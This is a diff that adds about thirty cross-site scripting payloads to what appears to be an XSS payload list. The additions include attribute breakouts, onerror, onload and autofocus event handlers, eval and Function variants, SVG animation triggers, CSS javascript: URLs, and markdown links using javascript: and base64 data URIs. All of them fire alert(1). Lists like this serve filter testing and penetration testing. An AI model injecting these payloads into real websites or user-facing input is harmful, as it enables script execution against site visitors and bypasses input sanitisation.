@@ -244,6 +244,35 @@ alert?.`1`
 (alert)(1)
 (alert(1))
 ((alert))(1)
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+"><input onfocus=alert(1) autofocus>
+"><textarea onfocus=alert(1) autofocus>
+"><select onfocus=alert(1) autofocus>
+"><keygen onfocus=alert(1) autofocus>
+<script>eval('alert(1)')</script>
+<script>Function('alert(1)')()</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>new Function('alert(1)')()</script>
+<script>top['alert'](1)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](1)</script>
+<script>this['alert'](1)</script>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<meter onmouseover=alert(1)>
+<progress onmouseover=alert(1)>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+<svg><set attributeName=x dur=1s onbegin=alert(1)></svg>
+<style>@import 'javascript:alert(1)';</style>
+<style>*{background:url('javascript:alert(1)')}</style>
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+[Click me](javascript:alert(1))
+[Click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
 
 # Advanced HTML5 API Abuse
 <video><source onerror="javascript:alert(1)">
